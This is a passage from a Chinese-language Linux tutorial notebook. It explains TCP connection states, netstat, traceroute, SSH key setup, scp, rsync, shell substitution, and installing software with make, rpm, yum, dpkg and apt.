序将调用CLOSE关闭连接。这导致它的TCP也发送一个 FIN,等待对方的ACK.就进入了LAST-ACK. The remote end has shut down, and the socket is closed. Waiting foracknowledgement. 等待原来发向远程TCP的连接中断请求的确认\n- `TIME_WAIT`：在主动关闭端接收到FIN后，TCP 就发送ACK包，并进入TIME-WAIT状态。 Thesocket is waiting after close to handle packets still in the network.等待足够的时间以确保远程TCP接收到连接中断请求的确认\n- `CLOSING`：比较少见. Bothsockets are shut down but we still don’t have all our datasent. 等待远程TCP对连接中断的确认 \n- `CLOSED`：被动关闭端在接受到ACK包后，就进入了closed的状态。连接结束.The socket is not being used. 没有任何连接状态 \n- `UNKNOWN`：未知的Socket状态。Thestate of the socket is unknown.\n\n\n备注\n- SYN: (同步序列编号,SynchronizeSequence Numbers)该标志仅在三次握手建立TCP连接时有效。表示一个新的TCP连接请求。\n- ACK: (确认编号,AcknowledgementNumber)是对TCP请求的确认标志,同时提示对端系统已经成功接收所有数据。\n- FIN: (结束标志,FINish)用来结束一个TCP回话.但对应端口仍处于开放状态,准备接收后续数据。\n\n### 实例2：显示每个协议的统计信息\n\n命令：\n- netstat -s     # 显示所有端口的统计信息\n- netstat -st    # 显示所有TCP的统计信息\n- netstat -su    # 显示所有UDP的统计信息\n\n### 常用输出\n`netstat -anp`\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220428141919.png)\n\n## traceroute\nLinux traceroute命令用于显示数据包到主机间的路径。\n\ntraceroute指令让你追踪网络数据包的路由途径，预设数据包大小是40Bytes，用户可另行设置。\n\n参数说明：\n- -d 使用Socket层级的排错功能。\n- -f<存活数值> 设置第一个检测数据包的存活数值TTL的大小。\n- -F 设置勿离断位。\n- -g<网关> 设置来源路由网关，最多可设置8个。\n- -i<网络界面> 使用指定的网络界面送出数据包。\n- -I 使用ICMP回应取代UDP资料信息。\n- -m<存活数值> 设置检测数据包的最大存活数值TTL的大小。\n- -n 直接使用IP地址而非主机名称。\n- -p<通信端口> 设置UDP传输协议的通信端口。\n- -r 忽略普通的Routing Table，直接将数据包送到远端主机上。\n- -s<来源地址> 设置本地主机送出数据包的IP地址。\n- -t<服务类型> 设置检测数据包的TOS数值。\n- -v 详细显示指令的执行过程。\n- -w<超时秒数> 设置等待远端主机回报的时间。\n- -x 开启或关闭数据包的正确性检验。\n\n### 实例\n显示到达目的地的数据包路由\n```bash\n# traceroute www.google.com\ntraceroute: Warning: www.google.com has multiple addresses; using 66.249.89.99\ntraceroute to www.l.google.com (66.249.89.99), 30 hops max, 38 byte packets\n1 192.168.0.1 (192.168.0.1) 0.653 ms 0.846 ms 0.200 ms\n2 118.250.4.1 (118.250.4.1) 36.610 ms 58.438 ms 55.146 ms\n3 222.247.28.177 (222.247.28.177) 54.809 ms 39.879 ms 19.186 ms\n4 61.187.255.253 (61.187.255.253) 18.033 ms 49.699 ms 72.147 ms\n5 61.137.2.177 (61.137.2.177) 32.912 ms 72.947 ms 41.809 ms\n6 202.97.46.5 (202.97.46.5) 60.436 ms 25.527 ms 40.023 ms\n7 202.97.35.69 (202.97.35.69) 40.049 ms 66.091 ms 44.358 ms\n8 202.97.35.110 (202.97.35.110) 42.140 ms 70.913 ms 41.144 ms\n9 202.97.35.14 (202.97.35.14) 116.929 ms 57.081 ms 60.336 ms\n10 202.97.60.34 (202.97.60.34) 54.871 ms 69.302 ms 64.353 ms\n11 * * *\n12 209.85.255.80 (209.85.255.80) 95.954 ms 79.844 ms 76.052 ms\n   MPLS Label=385825 CoS=5 TTL=1 S=0\n13 209.85.249.195 (209.85.249.195) 118.687 ms 120.905 ms 113.936 ms\n14 72.14.236.126 (72.14.236.126) 115.843 ms 137.109 ms 186.491 ms\n15 nrt04s01-in-f99.1e100.net (66.249.89.99) 168.024 ms 140.551 ms 161.127 ms\n```\n\n\n## SSH\n### ssh基础使用\nssh客户端是一种使用Secure Shell(ssh)协议连接到运行了ssh服务端的远程服务器上。ssh是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。它有如下优点：\n- 有效防止远程管理过程中的信息泄漏\n- 传输 数据加密，能够防止DNS和IP欺骗\n- 传输 数据压缩，加快传输速度\n\nOpenSSH 是 SSH协议的免费开源实现。OpenSSH提供了服务端程序(openssh-server)和客户端工具(openssh-client)。Mac和Linux中默认已安装ssh客户端，可直接在终端中使用ssh命令。Windows则需手动安装ssh客户端，较常用的Windows SSH客户端有PuTTY和XShell。\n\nOpenSSH服务端常用命令\n```bash\n# 安装服务端/客户端(Ubuntu)\n$ sudo apt install openssh-server/openssh-client\n\n# 查看ssh服务是否开启\n$ netstat -tlp | grep ssh\n\n# 启动/停止/重启 ssh服务\n$ sudo /etc/init.d/ssh start/stop/restart\n```\n\n```bash\n# 命令格式\n$ ssh [-options] [user@hostname]\n```\n- -p: 指定ssh端口号,默认端口为22\n- -i: 使用指定私钥文件连接服务器(免密登录)\n- user远程服务器登录的用户名，默认为当前用户\n- hostname远程服务器地址。可以是IP/域名/别名\n- exit或logout命令均可退出当前登录\n\n```bash\n# 以colin用户登录192.168.1.196的到ssh服务器\n$ ssh colin@192.168.1.196\n\n# 以colin用户登录到192.168.1.198的ssh服务器，使用2222端口\n$ ssh -p 2222 colin@192.168.1.198\n```\n\n### ssh高级配置\nssh配置信息都保存在~/.ssh中。ssh服务端配置文件默认为/etc/ssh/sshd_config。可以按需修改默认22端口等配置。\n\n|配置文件|作用|\n|--|--|\n|known_hosts|作为客户端。记录曾连接服务器授权。ssh第一次连接一台服务器会有一个授权提示，确认授权后会记录在此文件中，下次连接记录中的服务器时则不再需要进行授权确认提示|\n|authorized_keys|作为服务端。保存中客户端的免密连接的公钥文件|\n|config|作为客户端。记录连接服务器配置的别名|\n\n#### 服务器别名\n远程管理命令(如ssh,scp等)连接一台服务器时一般都需要提供 服务器地址、端口、用户名 ，每次输入比较繁琐，我们可以把经常使用的服务器连接参数打包记录到配置文件中并为其设置一个简单易记的别名。这样我们就可以通过别名方便的访问服务器，而不需要提供地址、端口、用户名等信息了。\n\n配置方法：创建或打开 ~/.ssh/config，在文件追加服务器配置信息。一台服务器配置格式如下\n```\nHost ColinMac\n  HostName 192.168.1.196\n  User colin\n  Port 22\n```\n以上配置中只有HostName是必选项，其他都可按需省略。配置完成后远程管理命令中就可以直接使用别名访问了，如\n```\n$ ssh ColinMac\n$ scp 123.txt ColinMac:Desktop\n```\n\n#### 免密登录\n```bash\n# 命令格式\n$ ssh-keygen [-options]\n```\n|options|含义|\n|--|--|\n|-t\t|指定加密类型,默认为非对称加密(rsa), 所有可选项[dsa,ecdsa,ed25519,rsa]|\n|-f\t|密钥文件名。|\n|-C\t|注释，将附加在密钥文件尾部|\n\n远程管理命令(如ssh,scp等)每次都需要提供用户密码保证安全。除此之外，我们也可配置使指定加密算法验证密钥文件的方式，避免每次输入密码。配置免密登录后，ssh连接和scp等远程管理命令都不需要再输密码。生成密钥时若指定了文件名，连接服务器时需要通过-i指定要验证的密钥文件,形如：ssh -i file user@host。默认文件名则可省略。默认配置只需以下两步：\n```bash\n# 客户端生成密钥对\n$ ssh-keygen\n\n# 上传公钥到服务器\n$ ssh-copy-id user@hostname   # 文件会自动上传为服务器特定文件 ～/.ssh/authorized_keys\n```\n完成以上步骤后直接使用ssh ColinUbuntu即可登录，服务器地址和密码均不用录入。\n\n\n#### 免密钥文件登录\n出于安全考虑，大部分服务器提供商如要求使用密钥文件进行远程登录，如GCP和AWS。下面我们以GCP为例来看如何简化连接操作,这搞起来吧...\n\n##### 生成密钥对\n```bash\n$ ssh-keygen -t rsa -f ~/.ssh/[KEY_FILENAME] -C [USERNAME]\n$ chmod 400 ~/.ssh/[KEY_FILENAME]\n```\n\n##### 上传公钥\n在Compute Engine页面左侧菜单找到元数据,将上一步生成的公钥文件(KEY_FILENAME_pub)内容添加到SSH密钥中即可。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20211221181658.png)\n\n##### 连接GCP\n使用以下命令登录即可\n```bash\n$ ssh -i ~/.ssh/KEY_FILENAME [USERNAME]@[IP_ADDRESS]\n```\n\n##### 简化登录\n以上是GCP官方步骤，使用IdentityFile方式进行登录，每次ssh登录都要通过-i选项指定私钥路径比较繁琐，我们可以将密钥文件添加到ssh客户端config中以简化连接命令。\n```\nHost *\n AddKeysToAgent yes\n UseKeychain yes  # only for mac\n\nHost tu\n   HostName IP_ADDRESS\n   Port 22\n   User USERNAME\n   IdentityFile ~/.ssh/gcp\n```\n按照以上配置添加到～/.ssh/config中\n```bash\n# 后台运行ssh-agent\n$ eval \"$(ssh-agent -s)\"\n# 添加密钥到ssh-agent\n$ ssh-add -K ~/.ssh/gcp\n```\n完成以上配置后，连接服务器只需使用 ssh tu即可。\n\n\n## scp命令\n- Linux scp 命令用于 Linux 之间复制文件和目录。\n- scp 是 secure copy 的缩写, scp 是 linux 系统下基于 ssh 登陆进行安全的远程文件拷贝命令。\n- scp 是加密的，rcp 是不加密的，scp 是 rcp 的加强版。\n\n### 语法\n```bash\nscp [-1246BCpqrv] [-c cipher] [-F ssh_config] [-i identity_file]\n[-l limit] [-o ssh_option] [-P port] [-S program]\n[[user@]host1:]file1 [...] [[user@]host2:]file2\n```\n简易写法:\n```bash\nscp [可选参数] file_source file_target \n```\n参数说明：\n- -1： 强制scp命令使用协议ssh1\n- -2： 强制scp命令使用协议ssh2\n- -4： 强制scp命令只使用IPv4寻址\n- -6： 强制scp命令只使用IPv6寻址\n- -B： 使用批处理模式（传输过程中不询问传输口令或短语）\n- -C： 允许压缩。（将-C标志传递给ssh，从而打开压缩功能）\n- -p：保留原文件的修改时间，访问时间和访问权限。\n- -q： 不显示传输进度条。\n- -r： 递归复制整个目录。\n- -v：详细方式显示输出。scp和ssh(1)会显示出整个过程的调试信息。这些信息用于调试连接，验证和配置问题。\n- -c cipher： 以cipher将数据传输进行加密，这个选项将直接传递给ssh。\n- `-F ssh_config`： 指定一个替代的ssh配置文件，此参数直接传递给ssh。\n- `-i identity_file`： 从指定文件中读取传输时使用的密钥文件，此参数直接传递给ssh。\n- `-l limit`： 限定用户所能使用的带宽，以Kbit/s为单位。\n- `-o ssh_option`： 如果习惯于使用`ssh_config(5)`中的参数传递方式，\n- -P port：注意是大写的P, port是指定数据传输用到的端口号\n- -S program： 指定加密传输时所使用的程序。此程序必须能够理解ssh(1)的选项。\n\n### 实例\n1. 从本地复制到远程\n命令格式：\n```bash\nscp local_file remote_username@remote_ip:remote_folder \n#或者 \nscp local_file remote_username@remote_ip:remote_file \n#或者 \nscp local_file remote_ip:remote_folder \n#或者 \nscp local_file remote_ip:remote_file \n```\n- 第1,2个指定了用户名，命令执行后需要再输入密码，第1个仅指定了远程的目录，文件名字不变，第2个指定了文件名；\n- 第3,4个没有指定用户名，命令执行后需要输入用户名和密码，第3个仅指定了远程的目录，文件名字不变，第4个指定了文件名；\n应用实例：\n```bash\nscp /home/space/music/1.mp3 root@www.runoob.com:/home/root/others/music \nscp /home/space/music/1.mp3 root@www.runoob.com:/home/root/others/music/001.mp3 \nscp /home/space/music/1.mp3 www.runoob.com:/home/root/others/music \nscp /home/space/music/1.mp3 www.runoob.com:/home/root/others/music/001.mp3 \n```\n复制目录命令格式：\n```\nscp -r local_folder remote_username@remote_ip:remote_folder \n#或者 \nscp -r local_folder remote_ip:remote_folder \n```\n- 第1个指定了用户名，命令执行后需要再输入密码；\n- 第2个没有指定用户名，命令执行后需要输入用户名和密码；\n应用实例：\n```\nscp -r /home/space/music/ root@www.runoob.com:/home/root/others/ \nscp -r /home/space/music/ www.runoob.com:/home/root/others/ \n```\n上面命令将本地 music 目录复制到远程 others 目录下。\n\n2. 从远程复制到本地\n从远程复制到本地，只要将从本地复制到远程的命令的后2个参数调换顺序即可，如下实例\n```\nscp root@www.runoob.com:/home/root/others/music /home/space/music/1.mp3 \nscp -r www.runoob.com:/home/root/others/ /home/space/music/\n```\n\n### 说明\n1. 如果远程服务器防火墙有为scp命令设置了指定的端口，我们需要使用 -P 参数来设置命令的端口号，命令格式如下：\n```bash\n#scp 命令使用端口号 4588\nscp -P 4588 remote@www.runoob.com:/usr/local/sin.sh /home/administrator\n```\n2. 使用scp命令要确保使用的用户具有可读取远程服务器相应文件的权限，否则scp命令是无法起作用的。\n\n## rsync命令\nrsync 是一个常用的 Linux 应用程序，用于文件同步。\n\n它可以在本地计算机与远程计算机之间，或者两个本地目录之间同步文件（但不支持两台远程计算机之间的同步）。它也可以当作文件复制工具，替代`cp`和`mv`命令。\n\n它名称里面的`r`指的是 remote，rsync 其实就是\"远程同步\"（remote sync）的意思。与其他文件传输工具（如 FTP 或 scp）不同，rsync 的最大特点是会检查发送方和接收方已有的文件，仅传输有变动的部分（默认规则是文件大小或修改时间有变动）。\n\n### 安装\n如果本机或者远程计算机没有安装 rsync，可以用下面的命令安装。\n```bash\n# Debian\n$ sudo apt-get install rsync\n\n# Red Hat\n$ sudo yum install rsync\n\n# Arch Linux\n$ sudo pacman -S rsync\n```\n注意，传输的双方都必须安装 rsync。\n\n### 基本用法\n#### -r参数\n本机使用 rsync 命令时，可以作为`cp`和`mv`命令的替代方法，将源目录同步到目标目录。\n```bash\n$ rsync -r source destination\n```\n上面命令中，`-r`表示递归，即包含子目录。注意，`-r`是必须的，否则 `rsync` 运行不会成功。`source`目录表示源目录，`destination`表示目标目录。\n\n如果有多个文件或目录需要同步，可以写成下面这样。\n```bash\n$ rsync -r source1 source2 destination\n```\n上面命令中，`source1`、`source2`都会被同步到`destination`目录。\n\n#### -a参数\n`-a`参数可以替代`-r`，除了可以递归同步以外，还可以同步元信息（比如修改时间、权限等）。由于 rsync 默认使用文件大小和修改时间决定文件是否需要更新，所以`-a`比`-r`更有用。下面的用法才是常见的写法。\n```bash\n$ rsync -a source destination\n```\n目标目录`destination`如果不存在，rsync 会自动创建。执行上面的命令后，源目录`source`被完整地复制到了目标目录`destination`下面，即形成了`destination/source`的目录结构。\n\n如果只想同步源目录`source`里面的内容到目标目录`destination`，则需要在源目录后面加上斜杠。\n```bash\n$ rsync -a source/ destination\n```\n上面命令执行后，`source`目录里面的内容，就都被复制到了`destination`目录里面，并不会在`destination`下面创建一个`source`子目录。\n\n#### -n参数\n如果不确定 rsync 执行后会产生什么结果，可以先用`-n`或`--dry-run`参数模拟执行的结果。\n```bash\n$ rsync -anv source/ destination\n```\n上面命令中，`-n`参数模拟命令执行的结果，并不真的执行命令。`-v`参数则是将结果输出到终端，这样就可以看到哪些内容会被同步。\n\n####  --delete参数\n默认情况下，rsync 只确保源目录的所有内容（明确排除的文件除外）都复制到目标目录。它不会使两个目录保持相同，并且不会删除文件。如果要使得目标目录成为源目录的镜像副本，则必须使用`--delete`参数，这将删除只存在于目标目录、不存在于源目录的文件。\n```bash\n$ rsync -av --delete source/ destination\n```\n上面命令中，`--delete`参数会使得`destination`成为`source`的一个镜像。\n\n### 排除文件\n#### --exclude参数\n有时，我们希望同步时排除某些文件或目录，这时可以用`--exclude`参数指定排除模式。\n```bash\n$ rsync -av --exclude='*.txt' source/ destination\n# 或者\n$ rsync -av --exclude '*.txt' source/ destination\n```\n上面命令排除了所有 TXT 文件。\n\n注意，rsync 会同步以\"点\"开头的隐藏文件，如果要排除隐藏文件，可以这样写`--exclude=\".*\"`。\n\n如果要排除某个目录里面的所有文件，但不希望排除目录本身，可以写成下面这样。\n```bash\n$ rsync -av --exclude 'dir1/*' source/ destination\n```\n多个排除模式，可以用多个`--exclude`参数。\n```bash\n$ rsync -av --exclude 'file1.txt' --exclude 'dir1/*' source/ destination\n```\n多个排除模式也可以利用 Bash 的大扩号的扩展功能，只用一个`--exclude`参数。\n```bash\n$ rsync -av --exclude={'file1.txt','dir1/*'} source/ destination\n```\n如果排除模式很多，可以将它们写入一个文件，每个模式一行，然后用`--exclude-from`参数指定这个文件。\n```bash\n$ rsync -av --exclude-from='exclude-file.txt' source/ destination\n```\n\n#### --include参数\n`--include`参数用来指定必须同步的文件模式，往往与`--exclude`结合使用。\n```bash\n$ rsync -av --include=\"*.txt\" --exclude='*' source/ destination\n```\n上面命令指定同步时，排除所有文件，但是会包括 TXT 文件。\n\n### 远程同步\n#### SSH 协议\nrsync 除了支持本地两个目录之间的同步，也支持远程同步。它可以将本地内容，同步到远程服务器。\n```bash\n$ rsync -av source/ username@remote_host:destination\n```\n也可以将远程内容同步到本地。\n```bash\n$ rsync -av username@remote_host:source/ destination\n```\nrsync 默认使用 SSH 进行远程登录和数据传输。\n\n由于早期 rsync 不使用 SSH 协议，需要用`-e`参数指定协议，后来才改的。所以，下面`-e ssh`可以省略。\n```bash\n$ rsync -av -e ssh source/ user@remote_host:/destination\n```\n但是，如果 ssh 命令有附加的参数，则必须使用`-e`参数指定所要执行的 SSH 命令。\n```bash\n$ rsync -av -e 'ssh -p 2234' source/ user@remote_host:/destination\n```\n上面命令中，`-e`参数指定 SSH 使用2234端口。\n\n#### rsync 协议\n除了使用 SSH，如果另一台服务器安装并运行了 rsync 守护程序，则也可以用`rsync://`协议（默认端口873）进行传输。具体写法是服务器与目标目录之间使用双冒号分隔`::`。\n```bash\n$ rsync -av source/ 192.168.122.32::module/destination\n```\n注意，上面地址中的module并不是实际路径名，而是 rsync 守护程序指定的一个资源名，由管理员分配。\n如果想知道 rsync 守护程序分配的所有 module 列表，可以执行下面命令。\n```bash\n$ rsync rsync://192.168.122.32\n```\nrsync 协议除了使用双冒号，也可以直接用`rsync://`协议指定地址。\n```bash\n$ rsync -av source/ rsync://192.168.122.32/module/destination\n```\n\n### rsync和scp区别\n- scp是相当于复制，黏贴，如果有的话是覆盖，比较耗时间，不智能。\n- rsync是复制，如果有重复的文件，会直接跳过，而且他自己的算法优化。\n- scp是把文件全部复制过去，当文件修改后还是把所有文件复制过去，rsync 第一次是把所有文件同步过去，当文件修改后，只把修改的文件同步过去。\n\n# 管道相关命令\n## xargs\n- xargs（英文全拼： eXtended ARGuments）是给命令传递参数的一个过滤器，也是组合多个命令的一个工具。\n- xargs 可以将管道或标准输入（stdin）数据转换成命令行参数，也能够从文件的输出中读取数据。\n- xargs 也可以将单行或多行文本输入转换为其他格式，例如多行变单行，单行变多行。\n- xargs 默认的命令是 echo，这意味着通过管道传递给 xargs 的输入将会包含换行和空白，不过通过 xargs 的处理，换行和空白将被空格取代。\n- xargs 是一个强有力的命令，它能够捕获一个命令的输出，然后传递给另外一个命令。\n- 之所以能用到这个命令，关键是由于很多命令不支持|管道来传递参数，而日常工作中有有这个必要，所以就有了 xargs 命令，例如：\n```bash\nfind /sbin -perm +700 |ls -l       #这个命令是错误的\nfind /sbin -perm +700 |xargs ls -l   #这样才是正确的\n```\nxargs 一般是和管道一起使用。\n\n\n# shell脚本\n## $(),``, ${}\n### $( )与``\n在bash中，$( )与``（反引号）都是用来作命令替换的。\n\n命令替换与变量替换差不多，都是用来重组命令行的，先完成引号里的命令行，然后将其结果替换出来，再重组成新的命令行。\n```bash\n[root@localhost ~]# echo today is $(date \"+%Y-%m-%d\")\ntoday is 2017-11-07\n[root@localhost ~]# echo today is `date \"+%Y-%m-%d\"`\ntoday is 2017-11-07\n```\n$( )与｀｀在操作上，这两者都是达到相应的效果，但是建议使用$( )，因为｀｀很容易与''搞混乱，尤其对初学者来说，而$( )比较直观。\n\n最后，$( )的弊端是，并不是所有的类unix系统都支持这种方式，但反引号是肯定支持的。\n```bash\n[root@localhost ~]#  echo Linux `echo Shell `echo today is `date \"+%Y-%m-%d\"```\nLinux Shellecho today is 2017-11-07     #过多使用``会有问题\n[root@localhost ~]# echo Linux `echo Shell $(echo today is $(date \"+%Y-%m-%d\"))`\nLinux Shell today is 2017-11-07    ``和$()混合使用\n[root@localhost ~]# echo Linux $(echo Shell $(echo today is $(date \"+%Y-%m-%d\")))\nLinux Shell today is 2017-11-07    #多个$()同时使用也不会有问题\n```\n\n### ${ }变量替换\n一般情况下，$var与${var}是没有区别的，但是用${ }会比较精确的界定变量名称的范围\n```bash\n[root@localhost ~]# A=Linux\n[root@localhost ~]# echo $AB    #表示变量AB\n\n[root@localhost ~]# echo ${A}B    #表示变量A后连接着B\n```\n\n## 单引号与双引号\n- 单引号（'''）括起字符可以保留引号中每个字符的字面值。单引号之间可能不会出现单引号，即使前面有反斜杠也是如此\n- 双引号中的信息会保留字面量，但是同时会对$,`,，这些符号做出特殊的解析。就是双引号中的变量和转义，和函数操作可以被正常解析出来。\n\n\n# linux软件安装\n## 编译安装\n事实上，使用类似gcc的编译器来进行编译的过程并不简单，因为一个软件并不会仅有一个程序文件，而是有一堆程序代码文件。所以除了每个主程序与子程序均需要写上一条编译过程的命令外，还需要写上最终的链接程序。程序代码短的时候还好，如果是类似WWW服务器软件（例如Apache），或是类似内核的源代码，动辄数百MB的数据量，编译命令会写到疯掉，这个时候，我们就可以使用make这个命令的相关功能来进行编译过程的简化。\n当执行make 时，make 会在当前的目录下查找Makefile（or makefile）这个文本文件，而Makefle里面则记录了源代码如何编译的详细信息。make会自动地判别源代码是否经过变动了，而自动更新执行文件，是软件工程师相当好用的一个辅助工具。\n咦，make是一个程序，会去找Makefile，那Makefile怎么写？通常软件开发商都会字来检测用户的操作环境，以及该操作环境是否有软件开发商所需要的其他功能，该检测后，就会主动地建立这个Makefile的规则文件，通常这个检测程序的文件名为configure或是config。\n\n**至于make与configure运行流程的相关性**，如下图：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220406213439.png)\n\n你要进行的任务其实只有两个，一个是执行configure来建立Makefile, 这个步骤一定要成功。成功之后再以make来调用所需要的数据进行编译即可\n\n### 实战\n1. 安装gcc和make和两个工具，把源码包变成可以执行的程序\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220406213453.png)\n\n2. tar解包，释放源代码至指定目录。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220406213505.png)\n\n**以下所有步骤都要在解压目录下执行。**\n3. 执行`./configure`\n  \n![](https://raw.githubusercontent.com/NaisWang/images/master/20220406213521.png)\n\n**`prefix=PREFIX`，选择安装目录**\n\n4. make编译，生成可执行的二进制程序文件\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220406213540.png)\n\n5. make install安装，将编译好的文件复制到安装目录\nmake install后，进去/mnt/myprm看到以下包证明装完了\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220406213550.png)\n\n\n#### 卸载程序\n在linux 中用` ./configure && make && make install`后，  一般使用如下方法来删除\n**第一种情况：**\n使用官方的uninstall\n如果源代码提供了uninstall/distclean/veryclean文件，则使用如下代码即可\n```\nmake uninstall\nmake distclean\nmake veryclean\n```\n\n**第二种情况： 手动删除软件目录**\n由于程序是自己编译安装的，所以不会经过rpm数据库，所以没有记录安装。所以卸载就是直接删掉安装目录。\n\n## rpm\n### RPM包的安装\n安装 RPM 的命令格式为：\n```bash\n[root@localhost ~]# rpm -ivh /mnt/cdrom/Packages/httpd-2.2.15-15.el6.centos.1.i686.rpm\nPreparing...\n####################\n[100%]\n1:httpd\n####################\n[100%]\n```\n此命令中各选项参数的含义为：\n- -i：安装（install）;\n- -v：显示更详细的信息（verbose）;\n- -h：打印 #，显示安装进度（hash）;\n\n注意，直到出现两个 100% 才是真正的安装成功，第一个 100% 仅表示完成了安装准备工作。\n\n此命令还可以一次性安装多个软件包，仅需将包全名用空格分开即可，如下所示：\n```bash\n[root@localhost ~]# rpm -ivh a.rpm b.rpm c.rpm\n```\n\n### RPM包的升级\n使用如下命令即可实现 RPM 包的升级：\n```bash\n[root@localhost ~]# rpm -Uvh 包全名\n-U（大写）选项的含义是：如果该软件没安装过则直接安装；若没安装则升级至最新版本。\n\n[root@localhost ~]# rpm -Fvh 包全名\n-F（大写）选项的含义是：如果该软件没有安装，则不会安装，必须安装有较低版本才能升级。\n```\n\n### RPM包的卸载\nRPM 软件包的卸载很简单，使用如下命令即可：\n```bash\n[root@localhost ~]# rpm -e 包名\n```\n`-e`选项表示卸载，也就是 erase 的首字母。\n\n**RPM 软件包的卸载要考虑包之间的依赖性**。例如，我们mod_ssl软件包依赖httpd软件包，那么在卸载时，就必须先卸载 mod_ssl，然后卸载 httpd，否则会报错。\n软件包卸载和拆除大楼是一样的，本来先盖的 2 楼，后盖的 3 楼，那么拆楼时一定要先拆除 3 楼。\n\n如果卸载 RPM 软件不考虑依赖性，执行卸载命令会包依赖性错误，例如：\n```bash\n[root@localhost ~]# rpm -e httpd\nerror: Failed dependencies:\nhttpd-mmn = 20051115 is needed by (installed) mod_wsgi-3.2-1.el6.i686\nhttpd-mmn = 20051115 is needed by (installed) php-5.3.3-3.el6_2.8.i686\nhttpd-mmn = 20051115 is needed by (installed) mod_ssl-1:2.2.15-15.el6.\ncentos.1.i686\nhttpd-mmn = 20051115 is needed by (installed) mod_perl-2.0.4-10.el6.i686\nhttpd = 2.2.15-15.el6.centos.1 is needed by (installed) httpd-manual-2.2.\n15-15.el6.centos.1 .noarch\nhttpd is needed by (installed) webalizer-2.21_02-3.3.el6.i686\nhttpd is needed by (installed) mod_ssl-1:2.2.15-15.el6.centos.1.i686\nhttpd=0:2.2.15-15.el6.centos.1 is needed by(installed)mod_ssl-1:2.2.15-15.el6.centos.1.i686\n```\n\nRPM 软件包的卸载命令支持使用“-nocteps”选项，即可以不检测依赖性直接卸载，但此方式不推荐大家使用，因为此操作很可能导致其他软件也无法征程使用。\n\n### rpm 命令查询\n```bash\n[root@localhost ~]# rpm -qa\n[root@localhost ~]# rpm -q[licdR] 已安装的软件名称\n[root@localhost ~]# rpm -qp[licdR] 未安装的某个文件名称\n```\n- -q：查询软件包是否安装\n- -qa：查询系统中所有安装的软件包\n- -qi：查询软件包的详细信息\n- -ql：命令查询软件包的文件列表\n- -qf：命令查询系统文件属于哪个RPM包\n- -qR：查询软件包的依赖关系\n\n## yum\n### yum查询命令\n`ryum list`：查询所有已安装和可安装的软件包。\n`yum list 包名`：查询执行软件包的安装情况\n`yum search 关键字`：从 yum 源服务器上查找与关键字相关的所有软件包\n`yum info 包名`：查询执行软件包的详细信息\n\n### yum安装命令\nyum 安装软件包的命令基本格式为：\n```bash\n[root@localhost yum.repos.d]# yum -y install 包名\n```\n-y：自动回答 yes。如果不加 -y，那么每个安装的软件都需要手工回答 yes；\n\n### yum 升级命令\n使用 yum 升级软件包，需确保 yum 源服务器中软件包的版本比本机安装的软件包版本高。\nyum 升级软件包常用命令如下：\n`yum -y update`：升级所有软件包。不过考虑到服务器强调稳定性，因此该命令并不常用。\n`yum -y update 包名`：升级特定的软件包。\n\n### yum卸载命令\n使用 yum 卸载软件包时，会同时卸载所有与该包有依赖关系的其他软件包，即便有依赖包属于系统运行必备文件，也会被 yum 无情卸载，带来的直接后果就是使系统崩溃。\n除非你能确定卸载此包以及它的所有依赖包不会对系统产生影响，否则不要使用 yum 卸载软件包。\nyum 卸载命令的基本格式如下：\n```\n[root@localhost yum.repos.d]# yum remove 包名\n```\n\n## dpkg\n###  DPKG包的安装\n安装命令：dpkg -i 包全名\n选项\n- -i：安装\n- --unpack：解开软件包\n- --configure：配置软件包\n\n-i 选项所做操作包含解开软件包和配置软件包，相当于这两步操作：\ndpkg --unpack 包全名\ndpkg --configure 包名\n\n### DPKG包的卸载\n卸载命令：dpkg -r|-P 包名\n选项\n- -r：删除已安装的软件包，但保留配置文件\n- -P：删除已安装软件包，完全清除包（含配置文件）\n\n### DPKG包的查询\n1. 查询已安装软件包列表，命令：dpkg -l [包名]\n选项\n- -l：查询已安装软件包列表，包含状态、版本信息\n- 包名：查询指定的软件包，如果省略查询全部已安装软件包。包名可使用通配符\n\n2. 列出软件包关联文件，命令：dpkg -L 包名 或 dpkg -c 包全名\n选项\n- -L：列出已安装软件包关联文件列表\n- -c：列出未安装软件包关联文件列表\n也可以通过该命令查看软件包文件安装目录位置\n\n3. 显示软件包的详细状态，命令：dpkg -s 包名\n选项\n- -s 或 --status：显示软件包的详细状态\n\n4. 搜索含有指定文件的软件包，命令：dpkg -S 文件名\n选项\n- -S 或 --search：搜索含有指定文件的软件包。文件名可使用通配符\n示例：\n```bash\ntaicw@taicw-PC:~/Downloads$ dpkg -S apache2.conf\napache2: /etc/apache2/apache2.conf\n```\n\n5. 搜索系统中损坏的软件包，命令：dpkg -C\n\n## apt\nAPT 管理软件包，主要由以下几个命令组成：\n- apt-get：主要用来安装、升级和卸载软件，智能解决依赖关系(新版可用 apt 命令代替，去掉了\"-get\")\n- apt-cache：查询软件包缓存文件\n- apt-file：软件包查找工具，可以查到软件包所含的文件和安装的位置\n\n### apt安装命令\n`apt-get install 包名`\n\n### apt升级命令\n`apt-get upgrade` 更新所有已安装软件。只是简单的更新包，不管这些依赖，它不能添加新的软件包，或是删除软件包，并且不更改相应软件的配置文件\n`apt-get dist-upgrade` 可以根据依赖关系的变化，添加软件包，删除软件包，并且更改相应软件的配置文件，包括升级系统版本\n\n### apt卸载命令\n卸载命令：\n`apt-get remove 包名`: 删除指定软件，但是保留配置文件\n`apt-get --purge remove 包名`:  删除指定软件，同时删除配置文件\n`apt-get autoremove`:  删除系统内部不需要的依赖软件(一般指安装其他软件包时通过依赖安装的软件包)。该操作可能存在误删，无特殊需求尽量不要执行该命令\n\n### apt检查命令\n`apt-get check 包名`:检查软件包是否有损坏的依赖：\n\n# Unix目录结构的来历\nUnix（包含Linux）的初学者，常常会很困惑，不明白目录结构的含义何在。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220406213602.png)\n\n举例来说，根目录下面有一个子目录/bin，用于存放二进制程序。但是，/usr子目录下面还有/usr/bin，以及/usr/local/bin，也用于存放二进制程序；某些系统甚至还有/opt/bin。它们有何区别？\n原来Unix目录结构是历史造成的。1969年，Ken Thompson和Dennis 